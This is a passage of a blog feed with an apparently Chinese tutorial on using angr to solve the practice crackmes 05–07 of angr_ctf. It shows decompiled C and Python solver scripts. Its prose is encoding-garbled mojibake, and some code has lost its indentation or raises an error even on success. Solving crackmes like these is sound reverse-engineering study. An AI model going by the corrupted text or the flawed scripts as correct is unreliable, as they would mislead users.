python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./05_angr_symbolic_memory&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    start_address=<span class="number">0x8048601</span></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line">    </span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd2=claripy.BVS(<span class="string">&quot;passwd2&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd3=claripy.BVS(<span class="string">&quot;passwd3&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    address=<span class="number">0xA1BA1C0</span></span><br><span class="line">    init_state.memory.store(address,passwd0)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x8</span>,passwd1)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x10</span>,passwd2)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x18</span>,passwd3)</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x804866A</span>,avoid=<span class="number">0x8048658</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd1,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution2=solution_state.solver.<span class="built_in">eval</span>(passwd2,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution3=solution_state.solver.<span class="built_in">eval</span>(passwd3,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd0:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution0))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd2:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution2))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd3:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution3))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;couln not !!!!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="ä¸ƒã€06-åŠ¨æ€memory"><a href="#ä¸ƒã€06-åŠ¨æ€memory" class="headerlink" title="ä¸ƒã€06 åŠ¨æ€memory"></a>ä¸ƒã€06 åŠ¨æ€memory</h2><p>è¿™é‡Œæ˜¯åŠ¨æ€çš„chunkï¼Œmallocå‡ºæ¥çš„ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨åŠ¨æ€é‡Œè¿›è¡Œä¼ªé€ fakechunkï¼Œç„¶åå†å¾€è¿™ä¸ªä¼ªé€ çš„chunkè¿›è¡Œæ”¾å…¥å‘é‡å³å¯</p><p>å…ˆçœ‹ä¸‹æºä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buffer0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  buffer1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer0, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer1, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s&quot;</span>, buffer0, buffer1, v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;buffer0[i];</span><br><span class="line">    *v3 = complex_function(buffer0[i], i);</span><br><span class="line">    v4 = &amp;buffer1[i];</span><br><span class="line">    *v4 = complex_function(buffer1[i], i + <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buffer0, <span class="string">&quot;UODXLZBI&quot;</span>, <span class="number">8u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, <span class="string">&quot;UAORRAYF&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(buffer0);</span><br><span class="line">  <span class="built_in">free</span>(buffer1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–buffer0å’Œbuffer1çš„åœ°å€å¯¹è¿™ä¸ªåœ°å€è¿›è¡Œfakeå³å¯</p><p>ä»¥ä¸‹æ˜¯æˆ‘ä¼ªé€ çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">buf0=<span class="number">0xABCC8A4</span></span><br><span class="line">buf1=<span class="number">0xABCC8AC</span></span><br><span class="line">fake_buf0=<span class="number">0xAAAAA10</span></span><br><span class="line">fake_buf1=<span class="number">0xAAAAA20</span></span><br><span class="line">p1=claripy.BVS(<span class="string">&quot;p1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">p2=claripy.BVS(<span class="string">&quot;p2&quot;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">init_state.memory.store(buf0,fake_buf0,endness=proj.arch.memory_endness)</span><br><span class="line">init_state.memory.store(buf1,fake_buf1,endness=proj.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">init_state.memory.store(fake_buf0,p1)</span><br><span class="line">init_state.memory.store(fake_buf1,p2)</span><br></pre></td></tr></table></figure><p>ç„¶åä¸‹ä¸€æ­¥ä¸€æŠŠæ¢­è·å–çŠ¶æ€å€¼å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./06_angr_symbolic_dynamic_memory&quot;</span></span><br><span class="line"></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line"></span><br><span class="line">    start_address=<span class="number">0x8048699</span></span><br><span class="line"></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    buf0=<span class="number">0xABCC8A4</span></span><br><span class="line">    buf1=<span class="number">0xABCC8AC</span></span><br><span class="line">    fake_buf0=<span class="number">0xAAAAA10</span></span><br><span class="line">    fake_buf1=<span class="number">0xAAAAA20</span></span><br><span class="line">    p1=claripy.BVS(<span class="string">&quot;p1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    p2=claripy.BVS(<span class="string">&quot;p2&quot;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(buf0,fake_buf0,endness=proj.arch.memory_endness)</span><br><span class="line">    init_state.memory.store(buf1,fake_buf1,endness=proj.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(fake_buf0,p1)</span><br><span class="line">    init_state.memory.store(fake_buf1,p2)</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        sol_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        p1=sol_state.solver.<span class="built_in">eval</span>(p1,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        p2=sol_state.solver.<span class="built_in">eval</span>(p2,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p2:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colud not!!!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><p>å…«ã€07  ç¬¦å·fiileæ–‡ä»¶</p><p>è¿™ä¸ªé¢˜æ˜¯å¯¹fileæ–‡ä»¶è¿›è¡Œç¬¦å·åŒ–</p><p>æˆ‘ä»¬çœ‹ä¸‹é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, buffer);</span><br><span class="line">  ignore_me((<span class="type">int</span>)buffer, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  fp = fopen(<span class="string">&quot;OJKSQYDP.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  fread(buffer, <span class="number">1u</span>, <span class="number">0x40</span>u, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  unlink(<span class="string">&quot;OJKSQYDP.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0x804A0A0</span>) = complex_function(*(<span class="type">char</span> *)(i + <span class="number">0x804A0A0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buffer, <span class="string">&quot;AQWLCTXB&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œè¿™é“æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ã€‚åœ¨è¿™é“é¢˜çš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨angræ¨¡æ‹Ÿæ–‡ä»¶ä»è€Œè¿›è¡Œæ–‡ä»¶å†…å®¹ç¬¦å·åŒ–ï¼Œæˆ‘ä»¬ç”¨åˆ°äº†å‡ ä¸ªå…³é”®è¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_size=<span class="number">0x40</span></span><br><span class="line">filename=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">password=claripy.BVS(<span class="string">&#x27;password&#x27;</span>,file_size*<span class="number">8</span>)</span><br><span class="line">file_name=angr.storage.SimFile(filename,content=password,size=file_size)</span><br><span class="line">init_state.fs.insert(filename,file_name)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ©ç”¨angr.storage.SimFileæ¨¡æ‹Ÿæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶åï¼Œç¬¬äºŒä¸ªä¸ºæˆ‘ä»¬çš„å‘é‡ï¼Œç¬¬ä¸‰ä¸ªä¸ºé¢˜ç›®æœ¬èº«çš„è¯»å…¥çš„sizeï¼Œç„¶åæ¨¡æ‹Ÿå®Œåï¼Œæˆ‘ä»¬å†å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œè½½å…¥init_state.fs.insert(filename,file_name)å³å¯å®ç°æ–‡ä»¶ç¬¦å·åŒ–</p><p>ç„¶åå‰©ä¸‹å°±æ˜¯ç”¨angrè¿›è¡Œæ¨¡æ‹Ÿï¼Œè·å–çŠ¶æ€ï¼Œè·å–å‘é‡çŠ¶æ€å€¼ï¼Œä¸€æŠŠæ¢­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isGood</span>(<span class="params">state</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isBad</span>(<span class="params">state</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./07_angr_symbolic_file&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    </span><br><span class="line">    start_address=<span class="number">0x80488EA</span></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    file_size=<span class="number">0x40</span></span><br><span class="line">    filename=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">    password=claripy.BVS(<span class="string">&#x27;password&#x27;</span>,file_size*<span class="number">8</span>)</span><br><span class="line">    file_name=angr.storage.SimFile(filename,content=password,size=file_size)</span><br><span class="line">    init_state.fs.insert(filename,file_name)</span><br><span class="line">    </span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=isGood,avoid=isBad)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        sol_state=simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        passwd=sol_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colund not!!!!!!&quot;</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solver()   </span><br></pre></td></tr></table></figure><p>æœªå®ŒæŒç»­</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-Angr-ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰&quot;&gt;&lt;a href=&quot;#CTF-Angr-ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;CTF Angr ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰&quot;&gt;&lt;/a&gt;CTF Angr ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰&lt;/h1&gt;&lt;h2 id=&quot;å‰</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="angr" scheme="https://jsjsj.top/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>CTF Angr ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰</title>
    <link href="https://jsjsj.top/2022/10/03/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0/"/>
    <id>https://jsjsj.top/2022/10/03/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-10-03T14:17:58.000Z</published>
    <updated>2023-10-03T14:30:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-Angr-ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰"><a href="#CTF-Angr-ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰" class="headerlink" title="CTF Angr ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰"></a>CTF Angr ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰</h1><h2 id="å‰è¨€ï¼šæœ€è¿‘å¯¹è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å“¼æ„Ÿå…´è¶£ï¼Œç™¾åº¦äº†ä¸‹ï¼Œå‘ç°è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜çš„ä¸€ä¸ªæ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€Angrç¬¦å·æ‰§è¡Œï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å†åŠ ä¸Šä¹‹å‰æ¯”èµ›ä¹Ÿæœ‰å¾ˆå¤šå…³äºAngrçš„é¢˜ç›®ï¼Œangrä¹Ÿå¯ä»¥å¯¹æŠ—ä»£ç æ··æ·†ollvmè¿™äº›ï¼Œæ„Ÿè§‰ä»¥åç”¨å¤„è›®å¤§çš„ï¼Œäºæ˜¯å°±å­¦äº†å­¦ï¼Œè¿™é‡Œè®°å½•ä¸‹ç¬”è®°ï¼Œå‘åˆ°åšå®¢é‡Œå’Œå¾®ä¿¡å…¬ä¼—å·é‡Œä¾›å¤§å®¶å­¦ä¹ ï¼Œå­¦äº†ä¸€å¤©ï¼Œæ‰åˆšå­¦åˆ°07æ–‡ä»¶ç¬¦å·æ‰§è¡ŒåŒ–ï¼Œå°±åˆ†åˆ«æ€»ç»“æˆäº†ä¸€ã€äºŒã€ä¸‰ç¯‡ï¼Œå¤ªèœäº†"><a href="#å‰è¨€ï¼šæœ€è¿‘å¯¹è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å“¼æ„Ÿå…´è¶£ï¼Œç™¾åº¦äº†ä¸‹ï¼Œå‘ç°è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜çš„ä¸€ä¸ªæ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€Angrç¬¦å·æ‰§è¡Œï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å†åŠ ä¸Šä¹‹å‰æ¯”èµ›ä¹Ÿæœ‰å¾ˆå¤šå…³äºAngrçš„é¢˜ç›®ï¼Œangrä¹Ÿå¯ä»¥å¯¹æŠ—ä»£ç æ··æ·†ollvmè¿™äº›ï¼Œæ„Ÿè§‰ä»¥åç”¨å¤„è›®å¤§çš„ï¼Œäºæ˜¯å°±å­¦äº†å­¦ï¼Œè¿™é‡Œè®°å½•ä¸‹ç¬”è®°ï¼Œå‘åˆ°åšå®¢é‡Œå’Œå¾®ä¿¡å…¬ä¼—å·é‡Œä¾›å¤§å®¶å­¦ä¹ ï¼Œå­¦äº†ä¸€å¤©ï¼Œæ‰åˆšå­¦åˆ°07æ–‡ä»¶ç¬¦å·æ‰§è¡ŒåŒ–ï¼Œå°±åˆ†åˆ«æ€»ç»“æˆäº†ä¸€ã€äºŒã€ä¸‰ç¯‡ï¼Œå¤ªèœäº†" class="headerlink" title="å‰è¨€ï¼šæœ€è¿‘å¯¹è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å“¼æ„Ÿå…´è¶£ï¼Œç™¾åº¦äº†ä¸‹ï¼Œå‘ç°è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜çš„ä¸€ä¸ªæ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€Angrç¬¦å·æ‰§è¡Œï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å†åŠ ä¸Šä¹‹å‰æ¯”èµ›ä¹Ÿæœ‰å¾ˆå¤šå…³äºAngrçš„é¢˜ç›®ï¼Œangrä¹Ÿå¯ä»¥å¯¹æŠ—ä»£ç æ··æ·†ollvmè¿™äº›ï¼Œæ„Ÿè§‰ä»¥åç”¨å¤„è›®å¤§çš„ï¼Œäºæ˜¯å°±å­¦äº†å­¦ï¼Œè¿™é‡Œè®°å½•ä¸‹ç¬”è®°ï¼Œå‘åˆ°åšå®¢é‡Œå’Œå¾®ä¿¡å…¬ä¼—å·é‡Œä¾›å¤§å®¶å­¦ä¹ ï¼Œå­¦äº†ä¸€å¤©ï¼Œæ‰åˆšå­¦åˆ°07æ–‡ä»¶ç¬¦å·æ‰§è¡ŒåŒ–ï¼Œå°±åˆ†åˆ«æ€»ç»“æˆäº†ä¸€ã€äºŒã€ä¸‰ç¯‡ï¼Œå¤ªèœäº†"></a>å‰è¨€ï¼šæœ€è¿‘å¯¹è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å“¼æ„Ÿå…´è¶£ï¼Œç™¾åº¦äº†ä¸‹ï¼Œå‘ç°è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜çš„ä¸€ä¸ªæ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€Angrç¬¦å·æ‰§è¡Œï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å†åŠ ä¸Šä¹‹å‰æ¯”èµ›ä¹Ÿæœ‰å¾ˆå¤šå…³äºAngrçš„é¢˜ç›®ï¼Œangrä¹Ÿå¯ä»¥å¯¹æŠ—ä»£ç æ··æ·†ollvmè¿™äº›ï¼Œæ„Ÿè§‰ä»¥åç”¨å¤„è›®å¤§çš„ï¼Œäºæ˜¯å°±å­¦äº†å­¦ï¼Œè¿™é‡Œè®°å½•ä¸‹ç¬”è®°ï¼Œå‘åˆ°åšå®¢é‡Œå’Œå¾®ä¿¡å…¬ä¼—å·é‡Œä¾›å¤§å®¶å­¦ä¹ 